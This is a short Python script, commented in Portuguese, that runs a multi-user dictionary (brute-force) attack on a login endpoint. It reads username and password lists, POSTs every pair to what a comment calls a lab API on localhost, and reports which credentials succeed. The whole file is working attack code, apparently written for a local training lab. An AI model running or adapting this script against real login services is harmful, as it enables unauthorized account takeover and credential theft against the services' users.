import requests

# ==============================================================================
# 1. CONFIGURAÇÕES
# ==============================================================================
# Endereço da API do laboratório
url = "http://127.0.0.1:8002/login"

arquivo_usuarios = "usuarios.txt"
arquivo_senhas = "senhas.txt"

print("=" * 60)
print("   INICIANDO ATAQUE DE DICIONÁRIO MULTI-USUÁRIO")
print("=" * 60)

# ==============================================================================
# 2. CARREGAR OS ARQUIVOS PARA LISTAS NA MEMÓRIA
# ==============================================================================
with open(arquivo_usuarios, "r") as arq_u:
    usuarios = arq_u.read().splitlines()

with open(arquivo_senhas, "r") as arq_s:
    senhas = arq_s.read().splitlines()

print("Usuários carregados:", len(usuarios))
print("Senhas carregadas  :", len(senhas))
print("=" * 60)

# ==============================================================================
# 3. LOOP DUPLO: PARA CADA USUÁRIO, TESTA CADA SENHA
# ==============================================================================
for usuario in usuarios:
    print(f"\n[+] Testando usuário: >>> {usuario} <<<")
    senha_encontrada = False

    for senha in senhas:
        # Monta os dados para o envio
        dados = {
            "usuario": usuario,
            "senha": senha
        }

        # Faz a requisição POST para o login
        resposta = requests.post(url, json=dados)

        # Imprime o resultado do teste
        print(f"    Tentando senha '{senha}' -> Status: {resposta.status_code}")

        # Se for 200, acertamos a senha deste usuário!
        if resposta.status_code == 200:
            print(f"    >>> SUCESSO! Senha de '{usuario}' é: '{senha}' <<<")
            senha_encontrada = True
            break  # Sai do loop de senhas e passa para o próximo usuário

    if not senha_encontrada:
        print(f"    [-] Nenhuma senha funcionou para o usuário '{usuario}'.")

print("\n" + "=" * 60)
print("Fim dos testes para todos os usuários.")
print("=" * 60)
